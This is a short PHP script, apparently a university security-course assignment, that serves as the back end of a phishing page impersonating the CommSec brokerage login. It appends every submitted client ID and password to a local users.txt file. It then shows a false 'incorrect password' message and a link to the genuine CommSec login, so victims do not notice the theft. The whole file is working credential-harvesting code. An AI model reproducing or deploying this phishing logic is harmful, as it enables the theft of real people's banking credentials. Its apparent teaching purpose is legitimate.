<html>

<body>
    <?php

    /* If a user attempts to go directly to https://jupiter.csit.rmit.edu.au/~s3840848/ICT/A3/login.php
    then they will be redirected to the login page at index.html 
    */
    if (isset($_POST['client']) == FALSE) {
        header('Location: index.html');
    }

    //Receive Client ID from client side
    $entered_client = $_POST['client'];
    //Receive password from client side
    $entered_password = $_POST['password'];

    // If user input is not NULL then open a text file and print user input on new line
    if ($entered_client != "" & $entered_password != "") {

        //open a file named "users.txt"
        $file = fopen("users.txt", "a");
        //insert this user into the users.txt file
        fwrite($file, $entered_client . "," . $entered_password . "\n");
        //close the "$file"
        fclose($file);
        echo "Your Client ID/Password was incorrect";
        echo "<br/><a href='https://www2.commsec.com.au/secure/login?icid=LogInButton-cus-unt-eng-pen-pulibu-20210805-1'>Click Here</a> to go back and try again";
    } else {
        echo "Your Client ID/Password was incorrect<br/>
        <a href='https://www2.commsec.com.au/secure/login?icid=LogInButton-cus-unt-eng-pen-pulibu-20210805-1'>Click Here</a> to go back and try again";
    }
    ?>
</body>

</html>